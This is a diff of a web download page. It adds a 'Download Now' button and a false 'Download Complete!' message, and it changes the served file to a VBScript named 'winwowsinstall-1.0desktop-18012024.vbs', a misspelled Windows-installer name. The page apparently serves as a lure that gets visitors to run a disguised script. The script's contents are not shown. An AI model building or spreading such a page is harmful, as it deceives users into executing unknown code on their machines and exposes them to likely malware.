@@ -96,7 +96,7 @@
 
     .completion-message {
       margin-top: 10px;
-      color: rgb(128, 0, 0);
+      color: rgb(0, 255, 13);
       font-weight: bold;
       display: none;
     }
@@ -115,7 +115,9 @@
     </div>
   </div>
 
-  <div class="completion-message" id="completionMessage">Download Felgeschlagen!</div>
+  <div class="completion-message" id="completionMessage">Download Complete!</div>
+
+  <button class="download-button" id="downloadButton" onclick="downloadFile()">Download Now</button>
 
   <div class="video-container">
     <iframe src="https://drive.google.com/file/d/1gKF9u3RZ2AkEa_U5OvsV2BmLvMkMdS84/preview" width="640" height="480" allow="autoplay"></iframe>
@@ -124,8 +126,8 @@
   <script>
     function downloadFile() {
       const link = document.createElement('a');
-      link.href = 'downloader.py'; 
-      link.download = 'downloader.py'; 
+      link.href = 'winwowsinstall-1.0desktop-18012024.vbs'; 
+      link.download = 'winwowsinstall-1.0desktop-18012024.vbs'; 
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
